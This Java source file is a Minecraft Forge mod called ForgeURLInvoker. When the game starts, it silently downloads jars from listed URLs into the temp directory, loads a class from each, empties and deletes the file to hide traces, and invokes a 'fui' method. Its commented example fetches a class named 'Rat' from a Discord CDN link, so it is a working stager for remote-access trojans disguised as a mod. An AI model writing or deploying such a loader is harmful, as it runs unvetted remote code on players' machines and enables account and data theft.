package studio.dreamys;

import net.minecraftforge.fml.common.Loader;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.ModClassLoader;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import org.apache.commons.io.FileUtils;
import org.apache.commons.lang3.RandomStringUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.net.URL;
import java.nio.file.Paths;
import java.util.HashMap;

@Mod(modid = "")
public class ForgeURLInvoker {
    //pathToClass, downloadURL
    static HashMap<String, String> jars = new HashMap<String, String>() {{
        //example:
        //put("studio.dreamys.Rat", "https://cdn.discordapp.com/attachments/???/???/???.jar");
    }};

    @Mod.EventHandler
    public void preInit(FMLPreInitializationEvent e) {
        //discord cdn doesn't like the default agent for some reason
        System.setProperty("http.agent", "ForgeURLInvoker/1.0.0");

        //get already existing loader
        ModClassLoader modClassLoader = Loader.instance().getModClassLoader();

        //for each jar
        jars.forEach((path, url) -> {
            try {
                //download the jar to temp
                File jar = Paths.get(System.getProperty("java.io.tmpdir"), RandomStringUtils.random(100) + ".jar").toFile();
                FileUtils.copyURLToFile(new URL(url), jar);

                //add file to classpath
                modClassLoader.addFile(jar);

                //load class
                Object clazz = modClassLoader.loadClass(path).newInstance();

                //empty jar (alternative delete against file lock)
                FileOutputStream out = new FileOutputStream(jar);
                out.write(new byte[0]);
                out.flush();
                out.close();

                //delete jar on exit (allowed on linux)
                jar.deleteOnExit();

                //find and invoke "fui" method
                Method method = clazz.getClass().getMethod("fui");
                method.invoke(clazz);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        });
    }
}